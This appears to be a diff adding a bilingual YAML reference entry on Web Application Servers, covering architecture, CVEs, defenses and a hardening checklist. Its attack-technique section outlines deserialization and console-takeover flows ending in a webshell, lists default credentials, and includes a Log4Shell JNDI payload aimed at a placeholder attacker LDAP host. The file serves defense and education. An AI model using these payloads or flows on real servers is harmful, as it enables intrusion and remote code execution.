@@ -1,0 +1,773 @@
+# ============================================================
+# GR ATOM: Web Application Server (WAS)
+# ID: INFRA-APP-WAS-001
+# Version: 1.0
+# Status: Reference Template
+# ============================================================
+
+# ─────────────────────────────────────────────────────────────
+# 1. IDENTITY (정체성)
+# ─────────────────────────────────────────────────────────────
+id: "INFRA-APP-WAS-001"
+name: "Web Application Server"
+aliases: ["WAS", "Application Server", "App Server", "미들웨어", "웹 애플리케이션 서버"]
+normalized_name: "web_application_server"
+
+# ─────────────────────────────────────────────────────────────
+# 2. GR CLASSIFICATION (GR 분류)
+# ─────────────────────────────────────────────────────────────
+classification:
+  domain: "infrastructure"
+  type: "component"
+  abstraction_level: 2  # 1=Instance, 2=Type, 3=Concept, 4=Principle
+
+  gr_coordinates:
+    layer: "L7"           # Business Logic & Applications
+    zone: "Zone2"         # Service/Application Zone
+    function_tags:
+      - "A-runtime"       # 애플리케이션 실행 환경
+      - "A-business"      # 비즈니스 로직 처리
+      - "R-process"       # 프로세스/스레드 관리
+      - "I-api"           # API 제공
+      - "S-session"       # 세션 관리
+      - "D-cache"         # 내부 캐싱
+
+# ─────────────────────────────────────────────────────────────
+# 3. DEFINITION (정의) - LLM 학습용 핵심 텍스트
+# ─────────────────────────────────────────────────────────────
+definition:
+  what: |
+    Web Application Server(WAS)는 동적 웹 애플리케이션을 실행하는
+    미들웨어 소프트웨어다. 웹 서버와 데이터베이스 사이에서 비즈니스
+    로직을 처리하고, 클라이언트 요청에 대한 동적 응답을 생성한다.
+    Java EE(Jakarta EE), .NET, Python 등 다양한 플랫폼 기반으로
+    구현되며, Tomcat, JBoss, WebLogic 등이 대표적이다.
+
+  why: |
+    정적 콘텐츠만 제공하는 웹 서버와 달리, WAS는 프로그래밍 로직 실행,
+    데이터베이스 연동, 트랜잭션 처리가 필요한 현대 웹 서비스의 핵심이다.
+    세션 관리, 보안, 확장성을 위한 다양한 엔터프라이즈 기능을 제공하며,
+    대부분의 웹 기반 비즈니스 시스템에서 필수적인 인프라 요소다.
+
+  how: |
+    WAS의 동작 흐름:
+    1. 웹 서버/로드밸런서로부터 HTTP 요청 수신 (또는 직접 수신)
+    2. 요청 URL을 기반으로 적절한 애플리케이션 컴포넌트로 라우팅
+    3. 서블릿, JSP, EJB 등 비즈니스 로직 컴포넌트 실행
+    4. 필요시 JDBC로 데이터베이스 연결, 캐시 조회, 외부 API 호출
+    5. 처리 결과를 HTTP 응답으로 생성하여 클라이언트에 반환
+    6. 세션, 트랜잭션, 커넥션 풀 등 공유 리소스 관리
+
+    WAS는 멀티스레드 환경에서 동시 요청을 처리하며, 스레드 풀과
+    커넥션 풀을 통해 리소스를 효율적으로 관리한다.
+
+# ─────────────────────────────────────────────────────────────
+# 4. CORE CONCEPTS (핵심 개념) - 이해에 필수적인 지식
+# ─────────────────────────────────────────────────────────────
+core_concepts:
+  - name: "Thread Pool"
+    description: |
+      동시 요청 처리를 위한 스레드 재사용 메커니즘.
+      스레드 생성/소멸 오버헤드를 줄이고 시스템 리소스를 효율적으로 사용.
+      min/max 스레드 수, 큐 크기 등을 설정하여 동시성을 제어한다.
+    security_relevance: |
+      과도한 요청 시 스레드 고갈로 DoS 발생 가능.
+      스레드 덤프에 민감 정보가 노출될 수 있음.
+
+  - name: "Connection Pool"
+    description: |
+      데이터베이스 연결을 미리 생성하고 재사용하는 메커니즘.
+      DB 연결 생성 비용(TCP 핸드셰이크, 인증)을 절감.
+      HikariCP, DBCP, C3P0 등의 구현체가 있다.
+    security_relevance: |
+      풀 설정 파일에 DB 접속 정보(credential)가 포함됨.
+      설정 오류 시 연결 누수로 DB 접근 불가 상태 발생.
+
+  - name: "Session Management"
+    description: |
+      HTTP의 무상태(stateless) 특성을 극복하기 위한 사용자 상태 유지 메커니즘.
+      세션 ID를 쿠키나 URL 파라미터로 전달하여 사용자를 식별.
+      서버 메모리, 파일, DB, Redis 등에 세션 데이터 저장.
+    security_relevance: |
+      세션 하이재킹, 세션 고정 공격의 주요 대상.
+      세션 타임아웃, Secure/HttpOnly 플래그 설정 중요.
+
+  - name: "Deployment Descriptor"
+    description: |
+      애플리케이션 설정 파일 (web.xml, application.xml 등).
+      서블릿 매핑, 필터 체인, 보안 제약, 환경 변수를 정의.
+      최근에는 어노테이션 기반 설정으로 대체되는 추세.
+    security_relevance: |
+      잘못된 URL 매핑으로 인증 우회 가능.
+      민감한 설정 정보 노출 위험.
+
+  - name: "Class Loader"
+    description: |
+      Java 클래스를 동적으로 로드하는 메커니즘.
+      부모-자식 계층 구조로 클래스 격리 및 공유 관리.
+      WAS는 애플리케이션별로 독립된 클래스로더 제공.
+    security_relevance: |
+      역직렬화 공격의 핵심 요소 - 악성 클래스 로드 가능.
+      클래스로더 오염으로 전체 시스템 장악 가능.
+
+  - name: "JNDI (Java Naming and Directory Interface)"
+    description: |
+      리소스 위치를 이름으로 찾는 디렉토리 서비스 API.
+      DataSource, EJB, 환경 변수 등을 이름으로 조회.
+      java:comp/env 네임스페이스로 표준화.
+    security_relevance: |
+      JNDI Injection 공격 벡터 (Log4Shell의 핵심).
+      외부 LDAP/RMI 서버로 연결 유도하여 RCE 가능.
+
+# ─────────────────────────────────────────────────────────────
+# 5. RELATIONS (관계) - 온톨로지 핵심
+# ─────────────────────────────────────────────────────────────
+relations:
+  # 계층 관계
+  is_a:
+    - id: "CON-MIDDLEWARE-001"
+      name: "Middleware"
+      relation_type: "is_a"
+
+  has_subtypes:
+    - id: "INFRA-APP-WAS-TOMCAT-001"
+      name: "Apache Tomcat"
+      characteristics: "경량, 서블릿 컨테이너"
+    - id: "INFRA-APP-WAS-JBOSS-001"
+      name: "JBoss/WildFly"
+      characteristics: "Java EE 풀스택"
+    - id: "INFRA-APP-WAS-WEBLOGIC-001"
+      name: "Oracle WebLogic"
+      characteristics: "엔터프라이즈, 상용"
+    - id: "INFRA-APP-WAS-WEBSPHERE-001"
+      name: "IBM WebSphere"
+      characteristics: "엔터프라이즈, 레거시"
+
+  # 인프라 연결 관계 (upstream - 요청을 받는 곳)
+  connects_upstream:
+    - id: "INFRA-NET-LB-001"
+      name: "Load Balancer"
+      protocol: "HTTP/HTTPS"
+      port: "8080, 8443"
+      description: "트래픽 분산, 고가용성"
+
+    - id: "INFRA-APP-WEBSERVER-001"
+      name: "Web Server (Nginx/Apache)"
+      protocol: "HTTP, AJP"
+      port: "8080, 8009"
+      description: "정적 콘텐츠 처리, 리버스 프록시"
+
+    - id: "INFRA-NET-WAF-001"
+      name: "Web Application Firewall"
+      protocol: "HTTP/HTTPS"
+      description: "공격 필터링, 보호"
+
+  # 인프라 연결 관계 (downstream - 요청을 보내는 곳)
+  connects_downstream:
+    - id: "INFRA-DATA-RDBMS-001"
+      name: "Relational Database"
+      protocol: "JDBC"
+      port: "3306(MySQL), 5432(PostgreSQL), 1521(Oracle)"
+      description: "영속 데이터 저장"
+
+    - id: "INFRA-DATA-CACHE-001"
+      name: "Cache Server (Redis/Memcached)"
+      protocol: "TCP"
+      port: "6379, 11211"
+      description: "세션 저장, 데이터 캐싱"
+
+    - id: "INFRA-DATA-MQ-001"
+      name: "Message Queue"
+      protocol: "AMQP, JMS"
+      port: "5672, 61616"
+      description: "비동기 메시지 처리"
+
+    - id: "INFRA-IAM-LDAP-001"
+      name: "LDAP/Active Directory"
+      protocol: "LDAP/LDAPS"
+      port: "389, 636"
+      description: "사용자 인증, 권한 조회"
+
+  # 실행 환경
+  runs_on:
+    - id: "INFRA-RUNTIME-JVM-001"
+      name: "Java Virtual Machine"
+      required: true
+
+    - id: "INFRA-COMPUTE-VM-001"
+      name: "Virtual Machine"
+
+    - id: "INFRA-RUNTIME-CONTAINER-001"
+      name: "Container (Docker)"
+
+    - id: "INFRA-RUNTIME-K8S-001"
+      name: "Kubernetes Pod"
+
+  # 취약점 관계
+  vulnerable_to:
+    - id: "VUL-DESER-INSECURE-001"
+      name: "Insecure Deserialization"
+      severity: "Critical"
+
+    - id: "VUL-SSRF-001"
+      name: "Server-Side Request Forgery"
+      severity: "High"
+
+    - id: "VUL-INJECT-CMD-001"
+      name: "Command Injection"
+      severity: "Critical"
+
+    - id: "VUL-CONFIG-MISCONFIG-001"
+      name: "Security Misconfiguration"
+      severity: "High"
+
+  # 공격 대상
+  targeted_by:
+    - id: "ATK-SERVER-DESER-001"
+      name: "Deserialization Attack"
+
+    - id: "ATK-SERVER-SSRF-001"
+      name: "SSRF Attack"
+
+    - id: "ATK-AUTH-BYPASS-001"
+      name: "Authentication Bypass"
+
+  # 방어 관계
+  protected_by:
+    - id: "DEF-DETECT-WAF-001"
+      name: "WAF Detection Rules"
+
+    - id: "DEF-PREVENT-INPUTVAL-001"
+      name: "Input Validation"
+
+# ─────────────────────────────────────────────────────────────
+# 6. SECURITY PROFILE (보안 프로파일)
+# ─────────────────────────────────────────────────────────────
+security:
+  # 공격 표면
+  attack_surface:
+    exposed_ports:
+      - port: 8080
+        service: "HTTP"
+        risk: "medium"
+        note: "기본 HTTP 포트, 내부망 권장"
+
+      - port: 8443
+        service: "HTTPS"
+        risk: "low"
+        note: "TLS 암호화 적용"
+
+      - port: 8009
+        service: "AJP (Apache JServ Protocol)"
+        risk: "high"
+        note: "Ghostcat 취약점 (CVE-2020-1938), 반드시 방화벽 제한"
+
+      - port: 9990
+        service: "Management Console (JBoss)"
+        risk: "critical"
+        note: "관리 콘솔, 절대 외부 노출 금지"
+
+      - port: 7001
+        service: "WebLogic Admin"
+        risk: "critical"
+        note: "관리 포트, 내부망 전용"
+
+    exposed_interfaces:
+      - name: "HTTP/HTTPS Endpoints"
+        description: "비즈니스 API, 웹 페이지"
+        risk: "medium"
+
+      - name: "Management Console"
+        description: "웹 기반 관리 화면"
+        risk: "critical"
+
+      - name: "JMX (Java Management Extensions)"
+        description: "모니터링, 관리 API"
+        risk: "high"
+
+      - name: "JNDI (Java Naming)"
+        description: "리소스 룩업 서비스"
+        risk: "high"
+
+  # 관련 취약점 유형
+  common_vulnerabilities:
+    - id: "VUL-DESER-INSECURE-001"
+      name: "Insecure Deserialization"
+      cwe: "CWE-502"
+      description: "악의적 직렬화 객체를 통한 원격 코드 실행"
+      mitre_attack: "T1190"
+      likelihood: "high"
+      impact: "critical"
+
+    - id: "VUL-SSRF-001"
+      name: "Server-Side Request Forgery"
+      cwe: "CWE-918"
+      description: "WAS를 경유하여 내부 네트워크 접근"
+      mitre_attack: "T1090"
+      likelihood: "medium"
+      impact: "high"
+
+    - id: "VUL-XXE-001"
+      name: "XML External Entity"
+      cwe: "CWE-611"
+      description: "XML 파싱 시 외부 엔티티 로드"
+      mitre_attack: "T1190"
+      likelihood: "medium"
+      impact: "high"
+
+    - id: "VUL-PATH-TRAVERSAL-001"
+      name: "Path Traversal"
+      cwe: "CWE-22"
+      description: "파일 업로드/다운로드에서 경로 조작"
+      mitre_attack: "T1083"
+      likelihood: "medium"
+      impact: "high"
+
+    - id: "VUL-AUTH-SESSION-001"
+      name: "Session Management Flaw"
+      cwe: "CWE-384"
+      description: "세션 고정, 예측 가능한 세션 ID"
+      mitre_attack: "T1539"
+      likelihood: "medium"
+      impact: "medium"
+
+  # 실제 CVE 사례
+  notable_cves:
+    - id: "CVE-2017-5638"
+      product: "Apache Struts 2"
+      severity: "Critical (10.0)"
+      description: "Content-Type 헤더 OGNL 인젝션으로 RCE"
+      affected_versions: "Struts 2.3.x - 2.5.x"
+      remediation: "2.3.32 또는 2.5.10.1 이상 업그레이드"
+
+    - id: "CVE-2021-44228"
+      product: "Apache Log4j 2 (WAS에서 사용)"
+      severity: "Critical (10.0)"
+      description: "Log4Shell - JNDI 인젝션을 통한 원격 코드 실행"
+      affected_versions: "2.0-beta9 ~ 2.14.1"
+      remediation: "2.17.0 이상 업그레이드, JNDI 룩업 비활성화"
+
+    - id: "CVE-2020-1938"
+      product: "Apache Tomcat"
+      severity: "Critical (9.8)"
+      description: "Ghostcat - AJP 프로토콜 파일 읽기 및 RCE"
+      affected_versions: "9.0.0 ~ 9.0.30, 8.5.0 ~ 8.5.50"
+      remediation: "AJP 비활성화 또는 secret 설정, 패치 적용"
+
+    - id: "CVE-2017-12617"
+      product: "Apache Tomcat"
+      severity: "High (8.1)"
+      description: "PUT 메소드로 JSP 파일 업로드 후 RCE"
+      affected_versions: "7.0.0 ~ 7.0.81, 9.0.0.M1 ~ 9.0.1"
+      remediation: "readonly=true 설정, PUT 메소드 비활성화"
+
+    - id: "CVE-2020-2555"
+      product: "Oracle WebLogic"
+      severity: "Critical (9.8)"
+      description: "T3 프로토콜 역직렬화 RCE"
+      affected_versions: "10.3.6.0.0, 12.x"
+      remediation: "최신 패치 적용, T3 프로토콜 제한"
+
+  # 관련 공격 기법
+  attack_techniques:
+    - id: "ATK-RCE-DESER-001"
+      name: "Java Deserialization RCE"
+      mitre: "T1190"
+      description: "ysoserial, marshalsec 등으로 악성 직렬화 객체 생성 후 전송"
+      preconditions:
+        - "직렬화 엔드포인트 존재"
+        - "취약한 라이브러리 (Commons Collections, Spring 등)"
+      typical_flow:
+        - "직렬화 엔드포인트 식별 (JMX, RMI, T3, HTTP)"
+        - "사용 라이브러리 및 버전 확인"
+        - "적절한 gadget chain 선택"
+        - "ysoserial로 페이로드 생성"
+        - "페이로드 전송 및 실행 확인"
+      tools: ["ysoserial", "marshalsec", "GadgetProbe"]
+
+    - id: "ATK-CONSOLE-001"
+      name: "Management Console Exploitation"
+      mitre: "T1078"
+      description: "관리 콘솔의 기본 계정 또는 취약한 인증을 통한 접근"
+      preconditions:
+        - "관리 포트 외부 노출"
+        - "기본 계정 또는 취약한 인증"
+      typical_flow:
+        - "관리 포트 스캔 (8080, 9990, 7001 등)"
+        - "기본 계정 시도 (admin/admin, weblogic/weblogic)"
+        - "콘솔 접근 후 WAR 파일 배포"
+        - "웹쉘 실행"
+      tools: ["nmap", "hydra", "custom scripts"]
+
+    - id: "ATK-JNDI-001"
+      name: "JNDI Injection"
+      mitre: "T1190"
+      description: "Log4Shell 류의 JNDI 룩업을 통한 원격 코드 실행"
+      preconditions:
+        - "취약한 Log4j 버전 사용"
+        - "사용자 입력이 로깅되는 경로"
+      typical_flow:
+        - "JNDI 페이로드 삽입 가능 지점 탐색"
+        - "악성 LDAP/RMI 서버 구축"
+        - "${jndi:ldap://attacker/a} 페이로드 전송"
+        - "대상 서버가 공격자 서버로 연결"
+        - "악성 클래스 로드 및 실행"
+      tools: ["rogue-jndi", "JNDI-Injection-Exploit"]
+
+  # 방어 기법
+  defenses:
+    - id: "DEF-DETECT-WAF-001"
+      name: "Web Application Firewall"
+      effectiveness: "high"
+      description: "알려진 공격 패턴 탐지 및 차단"
+      implementation: "ModSecurity, AWS WAF, Cloudflare WAF"
+
+    - id: "DEF-PREVENT-PATCH-001"
+      name: "Regular Patching"
+      effectiveness: "critical"
+      description: "WAS 및 라이브러리 최신 버전 유지"
+      implementation: "정기 패치 주기 수립, 취약점 모니터링"
+
+    - id: "DEF-PREVENT-DESER-001"
+      name: "Deserialization Protection"
+      effectiveness: "high"
+      description: "화이트리스트 기반 역직렬화 클래스 필터링"
+      implementation: "JEP 290, SerialKiller, NotSoSerial"
+
+    - id: "DEF-PREVENT-NETWORK-001"
+      name: "Network Segmentation"
+      effectiveness: "high"
+      description: "관리 포트 내부망 제한, 방화벽 규칙"
+      implementation: "AJP, JMX, 관리콘솔 포트 방화벽 설정"
+
+    - id: "DEF-PREVENT-HARDENING-001"
+      name: "Server Hardening"
+      effectiveness: "medium"
+      description: "불필요한 기능, 샘플앱, 기본계정 제거"
+      implementation: "CIS Benchmark 적용"
+
+# ─────────────────────────────────────────────────────────────
+# 7. PRODUCTS (제품 인스턴스)
+# ─────────────────────────────────────────────────────────────
+products:
+  open_source:
+    - name: "Apache Tomcat"
+      vendor: "Apache Software Foundation"
+      language: "Java"
+      spec: "Servlet, JSP"
+      use_case: "경량, 단독 또는 Spring Boot 임베디드"
+      market_share: "높음"
+      security_note: "주기적 패치 필수, AJP 주의"
+
+    - name: "JBoss / WildFly"
+      vendor: "Red Hat"
+      language: "Java"
+      spec: "Java EE / Jakarta EE"
+      use_case: "엔터프라이즈 Java 애플리케이션"
+      market_share: "중간"
+      security_note: "관리콘솔 보안, 역직렬화 주의"
+
+    - name: "Jetty"
+      vendor: "Eclipse Foundation"
+      language: "Java"
+      spec: "Servlet, WebSocket"
+      use_case: "임베디드, 마이크로서비스"
+      market_share: "중간"
+      security_note: "경량으로 보안 기능 직접 구현 필요"
+
+    - name: "Undertow"
+      vendor: "Red Hat"
+      language: "Java"
+      spec: "Servlet"
+      use_case: "WildFly 내장, 고성능"
+      market_share: "낮음"
+
+  commercial:
+    - name: "Oracle WebLogic Server"
+      vendor: "Oracle"
+      language: "Java"
+      spec: "Java EE"
+      use_case: "대기업, 미션 크리티컬, 금융"
+      market_share: "높음 (엔터프라이즈)"
+      security_note: "정기 CPU 패치 필수, T3 프로토콜 주의"
+
+    - name: "IBM WebSphere Application Server"
+      vendor: "IBM"
+      language: "Java"
+      spec: "Java EE"
+      use_case: "레거시 엔터프라이즈, IBM 생태계"
+      market_share: "감소 중"
+      security_note: "복잡한 보안 설정, 정기 업데이트"
+
+  modern_alternatives:
+    - name: "Spring Boot (Embedded Tomcat/Jetty/Undertow)"
+      description: "WAS 없이 자체 실행 가능한 실행형 JAR"
+      trend: "증가"
+
+    - name: "Node.js"
+      description: "JavaScript 기반 비동기 서버"
+      trend: "증가"
+
+    - name: "Gunicorn / uWSGI"
+      description: "Python WSGI 애플리케이션 서버"
+      trend: "안정"
+
+# ─────────────────────────────────────────────────────────────
+# 8. PROTOCOLS & PORTS (프로토콜)
+# ─────────────────────────────────────────────────────────────
+protocols:
+  inbound:
+    - name: "HTTP/1.1"
+      port: "8080 (기본)"
+      encryption: "None"
+      security: "내부망 권장, 외부시 HTTPS 사용"
+
+    - name: "HTTP/2"
+      port: "8443 (기본)"
+      encryption: "TLS"
+      security: "TLS 1.2 이상 권장"
+
+    - name: "HTTPS/TLS"
+      port: "8443 (기본)"
+      encryption: "TLS 1.2/1.3"
+      security: "프로덕션 필수"
+
+    - name: "AJP (Apache JServ Protocol)"
+      port: "8009 (기본)"
+      encryption: "None"
+      security: "내부망 전용, Ghostcat 취약점 주의"
+      note: "Apache httpd 연동용 바이너리 프로토콜"
+
+  outbound:
+    - name: "JDBC"
+      target: "Database"
+      port: "3306(MySQL), 5432(PostgreSQL), 1521(Oracle)"
+      security: "SSL 연결 권장"
+
+    - name: "LDAP/LDAPS"
+      target: "Directory Service"
+      port: "389, 636 (SSL)"
+      security: "LDAPS 권장"
+
+    - name: "HTTP/HTTPS"
+      target: "External API"
+      port: "80, 443"
+      security: "인증서 검증 필수"
+
+    - name: "SMTP/SMTPS"
+      target: "Mail Server"
+      port: "25, 465, 587"
+      security: "TLS 권장"
+
+  management:
+    - name: "JMX (Java Management Extensions)"
+      port: "동적 또는 설정 (예: 9010)"
+      encryption: "선택적 SSL"
+      security: "인증 필수, 내부망 제한"
+      risk: "인증 없이 노출시 원격 코드 실행 가능"
+
+    - name: "RMI (Remote Method Invocation)"
+      port: "1099 (기본)"
+      encryption: "None"
+      security: "방화벽 필수"
+      risk: "역직렬화 공격 벡터"
+
+    - name: "JNDI"
+      port: "RMI/LDAP 포트 사용"
+      security: "JNDI 룩업 제한 필요"
+      risk: "Log4Shell 공격 벡터"
+
+# ─────────────────────────────────────────────────────────────
+# 9. CONFIGURATION CHECKLIST (보안 설정 체크리스트)
+# ─────────────────────────────────────────────────────────────
+security_checklist:
+  critical:
+    - item: "관리 콘솔 외부 접근 차단"
+      check: "방화벽에서 9990, 7001 등 차단 확인"
+      remediation: "iptables, security group 설정"
+
+    - item: "기본 계정 비활성화/변경"
+      check: "admin/admin, tomcat/tomcat 등 기본 계정 테스트"
+      remediation: "강력한 패스워드 설정, 불필요 계정 삭제"
+
+    - item: "AJP 포트 방화벽 제한"
+      check: "외부에서 8009 포트 접근 시도"
+      remediation: "AJP 비활성화 또는 secret 설정, 방화벽 차단"
+
+    - item: "디렉토리 리스팅 비활성화"
+      check: "디렉토리 URL 접근시 파일 목록 노출 확인"
+      remediation: "listings=false 설정"
+
+    - item: "샘플/테스트 애플리케이션 제거"
+      check: "/examples, /docs, /manager 등 기본 앱 확인"
+      remediation: "webapps에서 불필요한 디렉토리 삭제"
+
+  high:
+    - item: "HTTPS 강제"
+      check: "HTTP 접근시 리다이렉트 확인"
+      remediation: "Connector 설정, redirectPort"
+
+    - item: "세션 쿠키 보안 플래그"
+      check: "Set-Cookie 헤더에 Secure, HttpOnly 확인"
+      remediation: "web.xml cookie-config 설정"
+
+    - item: "에러 페이지 커스터마이징"
+      check: "에러 발생시 스택트레이스 노출 확인"
+      remediation: "error-page 설정, 커스텀 에러 페이지"
+
+    - item: "서버 버전 헤더 제거"
+      check: "응답 헤더에 Server 버전 정보 확인"
+      remediation: "server 속성 수정, 헤더 제거"
+
+    - item: "불필요한 HTTP 메소드 비활성화"
+      check: "TRACE, PUT, DELETE 메소드 테스트"
+      remediation: "security-constraint 설정"
+
+  medium:
+    - item: "접근 로그 설정"
+      check: "로그 파일 생성 및 내용 확인"
+      remediation: "AccessLogValve 설정"
+
+    - item: "세션 타임아웃 설정"
+      check: "session-timeout 값 확인 (권장: 30분 이하)"
+      remediation: "web.xml session-config"
+
+    - item: "커넥션/스레드 제한"
+      check: "maxThreads, maxConnections 값 확인"
+      remediation: "Connector 설정 튜닝"
+
+# ─────────────────────────────────────────────────────────────
+# 10. DIAGNOSIS HINTS (진단 힌트) - 자동화 도구용
+# ─────────────────────────────────────────────────────────────
+diagnosis:
+  fingerprinting:
+    - method: "HTTP 헤더 확인"
+      target: "Server, X-Powered-By 헤더"
+      examples:
+        - "Server: Apache-Coyote/1.1"
+        - "X-Powered-By: Servlet/4.0"
+        - "Server: WildFly/23"
+
+    - method: "기본 에러 페이지"
+      target: "404, 500 에러 페이지 형식"
+      examples:
+        - "Apache Tomcat/9.0.x - Error report"
+        - "JBoss Web/7.x"
+
+    - method: "기본 경로 접근"
+      target: "관리 URL 패턴"
+      paths:
+        - "/manager/html"      # Tomcat
+        - "/console"           # JBoss/WildFly
+        - "/admin"            # WebLogic
+        - "/ibm/console"      # WebSphere
+
+    - method: "특정 파일 존재 확인"
+      paths:
+        - "/favicon.ico"      # 제품별 다른 아이콘
+        - "/robots.txt"
+        - "/WEB-INF/web.xml"  # 접근 불가 확인
+
+  common_misconfigurations:
+    - name: "Manager App Exposed"
+      check: "GET /manager/html"
+      expected: "401 또는 404"
+      vulnerable: "200 또는 로그인 페이지"
+      risk: "Critical"
+      cwe: "CWE-16"
+
+    - name: "AJP Port Open"
+      check: "nmap -p 8009 <target>"
+      expected: "filtered 또는 closed"
+      vulnerable: "open"
+      risk: "High"
+      cve: "CVE-2020-1938"
+
+    - name: "Directory Listing Enabled"
+      check: "GET /examples/"
+      expected: "403 또는 404"
+      vulnerable: "디렉토리 목록 표시"
+      risk: "Medium"
+      cwe: "CWE-548"
+
+    - name: "Default Credentials"
+      check: "tomcat:tomcat, admin:admin 시도"
+      expected: "401 Unauthorized"
+      vulnerable: "200 OK"
+      risk: "Critical"
+      cwe: "CWE-798"
+
+    - name: "Stack Trace Exposure"
+      check: "유효하지 않은 요청 전송"
+      expected: "일반 에러 메시지"
+      vulnerable: "Java 스택트레이스 표시"
+      risk: "Medium"
+      cwe: "CWE-209"
+
+  version_detection:
+    - product: "Apache Tomcat"
+      methods:
+        - "에러 페이지에서 버전 추출"
+        - "Server 헤더 확인"
+        - "/docs/changelog.html 접근"
+
+    - product: "JBoss/WildFly"
+      methods:
+        - "console 페이지 확인"
+        - "특정 REST 엔드포인트"
+
+    - product: "WebLogic"
+      methods:
+        - "/console/login/LoginForm.jsp"
+        - "T3 프로토콜 배너"
+
+# ─────────────────────────────────────────────────────────────
+# 11. METADATA (메타데이터)
+# ─────────────────────────────────────────────────────────────
+metadata:
+  created_at: "2025-01-28"
+  updated_at: "2025-01-28"
+  version: "1.0"
+  status: "reference_template"
+  author: "GR System"
+  reviewers: []
+
+  confidence: 0.95
+  completeness: 0.90
+
+  sources:
+    - name: "OWASP Testing Guide v4"
+      url: "https://owasp.org/www-project-web-security-testing-guide/"
+      type: "methodology"
+
+    - name: "MITRE ATT&CK"
+      url: "https://attack.mitre.org/"
+      type: "framework"
+
+    - name: "CWE Database"
+      url: "https://cwe.mitre.org/"
+      type: "database"
+
+    - name: "Apache Tomcat Documentation"
+      url: "https://tomcat.apache.org/tomcat-9.0-doc/"
+      type: "official"
+
+    - name: "CIS Apache Tomcat Benchmark"
+      url: "https://www.cisecurity.org/benchmark/apache_tomcat"
+      type: "benchmark"
+
+    - name: "Practical Penetration Testing Experience"
+      type: "experience"
+
+  tags:
+    - "web"
+    - "java"
+    - "middleware"
+    - "enterprise"
+    - "critical-infrastructure"
+    - "owasp"
+
+  related_standards:
+    - "OWASP Top 10"
+    - "CIS Benchmark"
+    - "NIST SP 800-53"
